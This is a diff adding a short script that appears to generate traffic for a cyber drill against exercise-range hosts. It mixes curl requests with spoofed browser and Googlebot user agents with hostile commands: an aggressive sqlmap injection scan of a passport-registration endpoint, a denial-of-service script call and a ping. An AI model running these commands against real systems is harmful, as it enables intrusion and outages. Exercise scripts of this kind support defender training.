@@ -1,0 +1,24 @@
+curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://dangkyhochieu.dientap.cnsc/egov/php/create_captcha.php
+15
+curl -A "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586" http://oneshop.dientap.cnsc/index.php/free-extensions/image-gallery
+15
+curl -A "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586" http://noithat.dientap.cnsc/index.html
+15
+ping -c 18 192.168.220.52
+15
+curl -A "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586" http://dangkyhochieu.dientap.cnsc/egov/hoidap.html
+20
+curl -A "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" http://oneshop.dientap.cnsc
+20
+curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" http://noithat.dientap.cnsc
+20
+python /web/sqlmap/sqlmap.py -u 'http://dangkyhochieu.dientap.cnsc/egov/php/create_captcha.php'  --risk=3 --level=5 --batch
+20
+python /web/dos.py 527277972 527277972
+15
+curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" http://dangkyhochieu.dientap.cnsc/egov/check.html
+15
+curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://oneshop.dientap.cnsc/index.php/menu-styles
+15
+curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A" http://noithat.dientap.cnsc/contact.html
+15
